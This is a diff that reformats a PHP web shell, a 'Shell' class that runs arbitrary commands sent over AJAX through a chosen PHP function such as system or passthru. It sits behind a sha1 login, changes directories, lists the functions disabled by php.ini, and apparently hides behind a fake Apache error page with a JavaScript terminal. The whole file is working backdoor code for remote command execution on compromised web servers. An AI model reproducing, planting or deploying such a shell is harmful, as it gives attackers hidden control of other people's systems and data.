@@ -1,7 +1,10 @@
 <?php
 session_start();
-class Shell{
+
+class Shell {
+
     public $config;
+
     public function __construct(){
         $this->config = array(
             'filename' => basename(__FILE__),
@@ -20,9 +23,11 @@ class Shell{
             'last_page_modification' => getlastmod(),
             'cwd' => getcwd(),
         );
+
         if( isset($_SESSION['interpreter']) ){
             $this->config['interpreter'] = $_SESSION['interpreter'];
         }
+
         if(
             isset($_SESSION['cwd'])
             && $_SESSION['cwd'] != $this->config['cwd']
@@ -30,8 +35,10 @@ class Shell{
             chdir($_SESSION['cwd']);
             $this->config['cwd'] = getcwd();
         }
+
         $this->config['prompt'] = $this->get_prompt();
     }
+
     private function get_prompt(){
         $prompt = sprintf(
             '%s@%s [%s] %s $ ',
@@ -40,8 +47,10 @@ class Shell{
             date('Y/m/d H:i'),
             $this->config['cwd']
         );
+
         return $prompt;
     }
+
     public function login($username='', $password=''){
         if(
             sha1($username) == $this->config['username']
@@ -49,8 +58,10 @@ class Shell{
         ){
             return TRUE;
         }
+
         return FALSE;
     }
+
     private function is_ajax_request(){
         if(
             isset($_SERVER['HTTP_X_REQUESTED_WITH'])
@@ -58,31 +69,45 @@ class Shell{
         ){
             return TRUE;
         }
+
         return FALSE;
     }
+
     private function request($input=''){
         $method = $_SERVER['REQUEST_METHOD'];
-        switch($method){
+
+        switch( $method ){
             case 'POST': $data = $_POST; break;
             case 'GET': $data = $_GET; break;
             default: $data = array(); break;
         }
-        return array_key_exists($input, $data) ? $data[$input] : FALSE;
+
+        if( array_key_exists($input, $data) ){
+            return $data[$input];
+        }
+
+        return FALSE;
     }
+
     private function disabled_functions(){
         $functions = array();
         $disabled_functions = ini_get('disable_functions');
+
         if( !empty($disabled_functions) ){
             $list = explode(',', $disabled_functions);
+
             foreach($list as $function){
                 $function = trim($function);
+
                 if( !empty($function) ){
                     array_push($functions, $function);
                 }
             }
         }
+
         return $functions;
     }
+
     public function handle_execution(){
         if( $this->is_ajax_request() ){
             $interpreter = $this->config['interpreter'];
@@ -94,6 +119,7 @@ class Shell{
             exit;
         }
     }
+
     private function str2char( $text='' ){
         $conversion = '';
         $text_len = strlen($text);
@@ -111,6 +137,7 @@ class Shell{
 
         return $conversion;
     }
+
     private function compare($text='',$numbers=0){
         $comparison = '';
         $numbers = (string) $numbers;
@@ -123,38 +150,40 @@ class Shell{
 
         return ( $text == $comparison ? TRUE : FALSE );
     }
+
     private function execute($command=''){
         if( !empty($command) ){
             if( preg_match('/^set_interpreter\((.*)\)$/', $command, $match) ){
                 $interpreter = $match[1];
                 $disabled_functions = $this->disabled_functions();
+
                 if( in_array($interpreter, $disabled_functions) ){
                     return sprintf('Error. Function "%s" is blocked by php.ini', $interpreter);
-                }else{
+                } else {
                     if( function_exists($interpreter) ){
                         $_SESSION['interpreter'] = $interpreter;
                         $this->config['interpreter'] = $interpreter;
                         return sprintf('Success. Function "%s" was set correctly.', $interpreter);
-                    }else{
+                    } else {
                         return sprintf('Error. Function "%s" does not exists.', $interpreter);
                     }
                 }
-            }elseif( preg_match('/^get_interpreter$/', $command) ){
+            } elseif( preg_match('/^get_interpreter$/', $command) ){
                 return sprintf('Current interpreter set as: %s', $this->config['interpreter']);
-            }elseif( preg_match('/^get_disabled_functions$/', $command) ){
+            } elseif( preg_match('/^get_disabled_functions$/', $command) ){
                 $disabled_functions = $this->disabled_functions();
                 return sprintf('These functions are disabled throught php.ini: %s', implode(','.chr(32), $disabled_functions));
-            }elseif( preg_match('/^(get_php_version|php_version)$/', $command) ){
+            } elseif( preg_match('/^(get_php_version|php_version)$/', $command) ){
                 return sprintf('PHP version is: %s', PHP_VERSION);
-            }elseif( preg_match('/^cd (.*)/', $command, $match) ){
+            } elseif( preg_match('/^cd (.*)/', $command, $match) ){
                 $_SESSION['cwd'] = realpath($match[1]);
                 $this->config['cwd'] = $_SESSION['cwd'];
                 return sprintf('Changed directory to: %s', $_SESSION['cwd']);
-            }elseif( preg_match('/^(logout|exit)$/', $command) ){
+            } elseif( preg_match('/^(logout|exit)$/', $command) ){
                 $_SESSION['authenticated'] = 0;
                 session_destroy();
                 return 'location.reload';
-            }elseif( $command == 'status' ){
+            } elseif( $command == 'status' ){
                 $output_str = '';
                 $output_tpl = "Array (\n%s\n)";
                 foreach( $this->config as $config_name => $config_value ){
@@ -163,7 +192,7 @@ class Shell{
                 $output_str = rtrim($output_str, "\n");
                 $output = sprintf($output_tpl, $output_str);
                 return $output;
-            }else{
+            } else {
                 $output = NULL;
                 $result = NULL;
                 $capture_buffer = FALSE;
@@ -176,7 +205,7 @@ class Shell{
                     }catch(Exception $e){
                         $output = 'Caught exception: '.$e->getMessage();
                     }
-                }else{
+                } else {
                     if( $capture_buffer ){ ob_start(); }
                     $output = call_user_func($interpreter, $command);
                     if( $capture_buffer ){
@@ -192,6 +221,7 @@ class Shell{
         }
     }
 }
+
 $shell = new Shell();
 $shell->handle_execution();
 ?>
@@ -251,7 +281,7 @@ error was encountered while trying to use an ErrorDocument to handle the request
                 success: function(data, textStatus, jqXHR){
                     if( data=='location.reload' ){
                         window.location.reload();
-                    }else{
+                    } else {
                         term.set_prompt(data.prompt);
                         term.echo(data.output);
                         term.resume();
